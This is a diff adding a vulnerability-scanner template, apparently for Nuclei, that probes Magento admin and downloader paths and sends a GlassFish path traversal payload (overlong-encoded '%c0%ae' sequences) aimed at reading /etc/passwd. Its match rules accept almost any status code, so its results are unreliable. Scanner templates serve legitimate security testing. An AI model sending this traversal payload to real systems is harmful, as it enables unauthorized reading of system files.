@@ -1,0 +1,48 @@
+id: magento-glassfish-misconfig
+info:
+  name: Magento and GlassFish Misconfiguration Detection
+  author: pwn
+  severity: critical
+  description: Detects exposed Magento or GlassFish instances with accessible sensitive endpoints or vulnerable to path traversal, potentially leading to unauthorized access or system file exposure.
+  tags: magento, glassfish, misconfiguration, path-traversal
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php/admin/"
+      - "{{BaseURL}}/downloader/"
+      - "{{BaseURL}}/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
+      - "{{BaseURL}}:8080/index.php/admin/"
+      - "{{BaseURL}}:8080/downloader/"
+      - "{{BaseURL}}:8080/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Magento"
+          - "GlassFish"
+          - "passwd"
+        part: body
+        condition: or
+        case-insensitive: true
+      - type: word
+        words:
+          - "Magento"
+          - "GlassFish"
+        part: body
+        condition: or
+        case-insensitive: true
+      - type: status
+        status:
+          - 403
+          - 401
+    extractors:
+      - type: regex
+        name: matched_path
+        part: request
+        regex:
+          - "https?://[^/]+(/.*)"
+        group: 1
